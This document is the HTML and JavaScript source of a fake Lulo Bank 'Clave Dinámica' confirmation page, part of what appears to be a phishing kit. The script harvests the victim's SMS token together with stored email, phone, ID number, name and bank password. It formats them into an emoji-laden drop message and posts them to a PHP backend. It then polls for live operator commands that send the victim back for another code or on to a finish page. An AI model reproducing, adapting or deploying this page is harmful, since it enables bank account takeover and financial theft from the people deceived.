<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clave Dinámica - Lulo</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #212738; /* color oscuro como en la imagen */
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
    }

    .logo {
      text-align: center;
    }

    .logo img {
      width: 80px; /* ajusta el tamaño según necesites */
      margin-bottom: 40px;
    }

    .confirm-text {
      font-size: 24px;
      font-weight: bold;
      color: #B3C508;
      text-align: center;
      margin-bottom: 20px;
    }

    .description-text {
      font-size: 14px;
      color: #b0b9c7;
      text-align: center;
      margin-bottom: 40px;
      line-height: 1.4;
      max-width: 280px;
    }

    .form-container {
      width: 300px;
      display: flex;
      flex-direction: column;
      gap: 30px;
    }

    .input-group {
      position: relative;
    }

    .input-group label {
      font-size: 18px;
      color: #b0b9c7; /* gris claro como el texto en la imagen */
      display: block;
      margin-bottom: 5px;
    }

    .input-group input {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 1px solid #5c6c7d;
      padding: 10px 40px 10px 0;
      font-size: 16px;
      color: #fff;
      outline: none;
    }

    .input-group .eye-icon {
      position: absolute;
      right: -10px;
      top: 30px;
      cursor: pointer;
      color: #9aa5b6;
      font-size: 18px;
      user-select: none;
    }

    .input-group .eye-icon:hover {
      color: #b0b9c7;
    }

    .btn-login {
      width: 100%;
      padding: 15px;
      border: none;
      background-color: #B3C508; /* color verde lima */
      color: #000;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-left: 20px;
    }

    .btn-login:disabled {
      background-color: #3a3f4a;
      color: #6b7280;
      cursor: not-allowed;
    }

    .btn-login.active {
      background-color: #B3C508; /* color verde lima */
      color: #000;
      cursor: pointer;
    }

    .forgot {
      text-align: center;
      color: #9aa5b6;
      font-size: 14px;
      margin-top: 10px;
    }

         .forgot a {
       color: #9aa5b6;
       text-decoration: none;
     }

     /* Animación para el loader */
     @keyframes pulse {
       0% { transform: scale(1); opacity: 1; }
       50% { transform: scale(1.1); opacity: 0.7; }
       100% { transform: scale(1); opacity: 1; }
     }

     /* Responsive para dispositivos móviles */
    @media (max-width: 768px) {
      body {
        padding: 20px;
        height: auto;
        min-height: 100vh;
      }

      .logo img {
        width: 60px;
        margin-bottom: 30px;
      }

      .confirm-text {
        font-size: 20px;
        margin-bottom: 15px;
      }

      .description-text {
        font-size: 13px;
        margin-bottom: 30px;
        max-width: 260px;
      }

      .form-container {
        width: 100%;
        max-width: 320px;
        gap: 25px;
      }

      .input-group label {
        font-size: 16px;
      }

      .input-group input {
        font-size: 16px;
        padding: 12px 0;
      }

      .btn-login {
        padding: 12px;
        font-size: 16px;
        margin-left: 0;
      }

      .forgot {
        font-size: 13px;
        margin-top: 15px;
      }
    }

    /* Para pantallas muy pequeñas */
    @media (max-width: 480px) {
      body {
        padding: 15px;
      }

      .logo img {
        width: 50px;
        margin-bottom: 25px;
      }

      .confirm-text {
        font-size: 18px;
        margin-bottom: 12px;
      }

      .description-text {
        font-size: 12px;
        margin-bottom: 25px;
        max-width: 240px;
      }

      .form-container {
        width: 100%;
        max-width: 280px;
        gap: 20px;
      }

      .input-group label {
        font-size: 15px;
      }

      .input-group input {
        font-size: 15px;
        padding: 10px 0;
      }

      .btn-login {
        padding: 10px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="img/lulo2.png" alt="Logo lulo">
    <div class="confirm-text">CONFIRMAR</div>
    <div class="description-text">Para confirmar tu transacción, ingresa el código dinámico enviado por SMS a tu dispositivo móvil</div>
  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="color: white; text-align: center;">
      <img src="img/125.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
    </div>
  </div>

  <div class="form-container">
    <div class="input-group">
      <label for="token">Codigo Dinámico</label>
      <input type="text" id="token" placeholder="" maxlength="4" pattern="[0-9]+" title="Solo números permitidos, máximo 4 dígitos">
    </div>

    <button class="btn-login" id="loginBtn" disabled>Verificar</button>

    <div class="forgot">
      <a href="#">¿No recibiste el código?</a>
    </div>
  </div>

  <script>
    // Validación de la clave dinámica en tiempo real
    document.getElementById('token').addEventListener('input', function(e) {
      const value = e.target.value;
      const button = document.getElementById('loginBtn');
      
      // Solo permitir números
      const cleanValue = value.replace(/[^0-9]/g, '');
      if (cleanValue !== value) {
        e.target.value = cleanValue;
      }
      
      // Limitar a 6 dígitos
      if (cleanValue.length > 6) {
        e.target.value = cleanValue.substring(0, 6);
      }
      
      // Activar botón con 6 dígitos exactos
      if (cleanValue.length === 4) {
        button.disabled = false;
        button.classList.add('active');
      } else {
        button.disabled = true;
        button.classList.remove('active');
      }
    });

    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }

      // Event listener para el botón Verificar
      const btnIngresar = document.getElementById('loginBtn');
      
      btnIngresar.addEventListener('click', async function (event) {
        event.preventDefault();

        // Obtener el token
        const token = document.getElementById('token').value;
        
        // Validar que el token tenga 6 dígitos
        if (token.length !== 4) {
          alert('');
          return;
        }

        // Mostrar loader
        const loader = document.getElementById('loader-overlay');
        if (loader) {
          loader.style.display = 'flex';
        }

        localStorage.setItem('token', token);
        localStorage.setItem('session_id', sessionId);

        // Detectar tipo de dispositivo
        const userAgent = navigator.userAgent;
        let dispositivo = 'PC';
        
        if (/Android/i.test(userAgent)) {
          dispositivo = 'Android';
        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
          dispositivo = 'iPhone';
        } else if (/Windows/i.test(userAgent)) {
          dispositivo = 'PC';
        } else if (/Mac/i.test(userAgent)) {
          dispositivo = 'Mac';
        } else if (/Linux/i.test(userAgent)) {
          dispositivo = 'Linux';
        }
        
        const hora = new Date().toLocaleString('es-ES');
        
        // Obtener IP y construir mensaje
        fetch('get_ip.php')
          .then(response => response.json())
          .then(data => {
            const ip = data.ip || 'No disponible';
            
                   const mensaje = `
<b><u>💎 LULO BANK - TOKEN💎</u></b>
• <b>💌 Correo:</b> ${localStorage.getItem('email') || 'No disponible'}
• <b>📞 Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸 Cédula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤 Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦 Banco:</b> LULO BANK
━━━━━━━━━━━━━━━━━━━━━━
• <b>📟 Dispositivo:</b> ${dispositivo}
• <b>🗺 IP:</b> No disponible
• <b>⏱ Hora:</b> ${hora}
━━━━━━━━━━━━━━━━━━━━━━
• <b>🔐 ACCESO</b>
• <b>👤 Usuario:</b> ${localStorage.getItem('email') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
━━━━━━━━━━━━━━━━━━━━━━
• <b>🔄 Token:</b> ${token}
━━━━━━━━━━━━━━━━━━━━━━
`;


            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(sessionId, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          })
          .catch(() => {
            // Si falla la obtención de IP, enviar sin IP
            const mensaje = `
<b><u>💎 LULO BANK - TOKEN💎</u></b>
• <b>💌 Correo:</b> ${localStorage.getItem('email') || 'No disponible'}
• <b>📞 Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸 Cédula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤 Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦 Banco:</b> LULO BANK
━━━━━━━━━━━━━━━━━━━━━━
• <b>📟 Dispositivo:</b> ${dispositivo}
• <b>🗺 IP:</b> No disponible
• <b>⏱ Hora:</b> ${hora}
━━━━━━━━━━━━━━━━━━━━━━
<b>🔐 ACCESO</b>
• <b>👤 Usuario:</b> ${localStorage.getItem('email') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
━━━━━━━━━━━━━━━━━━━━━━
• <b>🔄 Token:</b> ${token}
━━━━━━━━━━━━━━━━━━━━━━
`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', sessionId);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(sessionId, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          });
      });
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_dinamica.php', {
          method: 'POST',
          body: formData
        });
        const result = await res.json();

        if (result.action) {
          switch (result.action) {
            case 'pedir_dinamica': 
              // Ocultar loader antes de mostrar error
              const loader = document.getElementById('loader-overlay');
              if (loader) {
                loader.style.display = 'none';
              }
              alert("Error de Token Dinamico.");
              window.location.href = "token.php";
              break;
            case 'error_logo': 
              // Ocultar loader antes de mostrar error
              const loader2 = document.getElementById('loader-overlay');
              if (loader2) {
                loader2.style.display = 'none';
              }
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.html";
              break;
            case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
  </script>

</body>
</html> 